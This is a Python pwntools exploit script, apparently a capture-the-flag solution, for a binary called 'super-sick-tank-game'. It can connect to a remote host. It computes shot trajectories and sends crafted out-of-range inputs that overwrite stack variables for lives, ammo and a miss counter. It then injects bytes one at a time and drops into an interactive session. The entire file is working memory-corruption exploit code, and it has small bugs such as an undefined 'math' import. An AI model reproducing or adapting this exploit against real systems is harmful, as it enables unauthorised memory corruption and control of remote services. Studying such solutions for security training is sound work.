from pwn import *
import sys

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "INFO"     
binary = "./super-sick-tank-game"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
    b *game_loop+362
    b *game_loop+1258
'''

def get_enemy():
    result = pp.recvuntil(b"|100m")
    enem = result.decode("utf-8").split("\n")
    traget = b""
    print(enem[0])

    for x in enem:
        if ("|\"\"\"\-=" in x):
            target = x.replace("|\"\"\"\-=  ", "")
            break;
    pos = 0
    for i in target :
        if (i == 'E'):
            break
        pos += 1
    return (pos)

def get_tragectoir(max_angle, max_power, en_pos):
    for x in range(0, max_angle):
        for i in range(0, max_power):
            rad_angle = (x * 3.141592653589793) / 180.0
            cos_angle = math.cos(rad_angle);
            sin_angle = math.sin(rad_angle);
            power = cos_angle * i * ((sin_angle * i + sin_angle * i) / 9.81);
            if (int(power) == en_pos):
                return (int(i), x)

def init():
    ## loading custom libc
    # env = {"LD_PRELOAD": "./desired_libc"}
    ## loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
    return pp

def shoot(enemy, max_power, max_angle):
        trag = get_tragectoir(max_angle, max_power, enemy)
        pp.recvuntil(b"power:")
        pp.sendline(str(trag[0]).encode("utf-8"))
        pp.recv()
        # pp.recvuntil(b"angle:")
        pp.sendline(str(trag[1]).encode("utf-8"))
        pp.recv()
        # pp.recvuntil(b"ready!")
        pp.sendline(b"pew!")


def get_weapon(befo, pew):
    log.info("getting the weapon")
    for i in range(0, 3):
        enemy_pos = get_enemy()
        if (befo == False):
            shoot(enemy_pos, 34, 90)
        else:
            zeb = b""
            while (b"Projectile" not in zeb):
                zeb = pp.recv()
                shit(enemy_pos, 34, 90, pew)
                pp.sendline(b"pew!")
    log.info("getting the nuclear weapon")
    if (befo == False):
        pp.recvuntil(b"2: -")
        pp.sendline(b"2")

def shit(enemy, max_power, max_angle, pew):
        trag = get_tragectoir(max_angle, max_power, enemy)
        pp.sendline(str(trag[0]).encode("utf-8"))
        pp.recv()
        # pp.recvuntil(b"angle:")
        pp.sendline(str(trag[1]).encode("utf-8"))
        # print(pp.recv())
        # pp.recvuntil(b"ready!")
        pp.sendline(pew)


def inject_bytes(start_pos, injectables, size):
    log.info("injecting shit")
    for i in range(0,size+1):
        pepe = b"pew!A" + injectables[i]
        get_weapon(True, pepe)
        zeb = pp.recv()
        while (b"2: -" not in zeb):
            get_weapon(True, pepe)
            print(f"97ba mok {zeb}")
            zeb = pp.recv()
        print(f"97ba mok {zeb}")
        pp.sendline(b"9")
        shoot(start_pos + i, 100 ,754974810)

def exploit(pp):
    log.info("binary loaded")
    max_angle = 90
    max_power = 34

    get_weapon(False, None)

    log.info("getting more power")
    shoot(111, max_power ,max_angle)
    max_power = 45

    get_weapon(False, None)
    shoot(0, max_power ,max_angle)
    max_angle = 754974810

    get_weapon(False, None)
    shoot(113, max_power ,max_angle)
    max_power = 2960685

    shoot(-299, 100 ,max_angle)
    ## feild_offset = 0x7fffffffdc78
    ## miss_ctr = 0x7fffffffdb4c
    ## ammo_type = 0x7fffffffdcee
    ## num_amo_type = 0x7fffffffdb60
    ## input buf = 0x7fffffffdcf0
    log.success("infinite ammount of lives")
    get_weapon(False, None)
    shoot(119, 100 ,max_angle)
    get_weapon(False, None)
    shoot(0, max_power ,max_angle)
    # shoot(4, max_power ,max_angle)
    log.info("overwriting the fucking number of ammo")
    get_weapon(False, None)
    shoot(-278, 100 ,max_angle)

    log.info("overwriting the miss_ctr")
    miss_ctr = [b"\x00", b"\x00", b"\x00", b"\x06"]
    inject_bytes(119, miss_ctr, 4)

    pp.interactive()

elf = context.binary = ELF(binary)
pp = init()
exploit(pp)

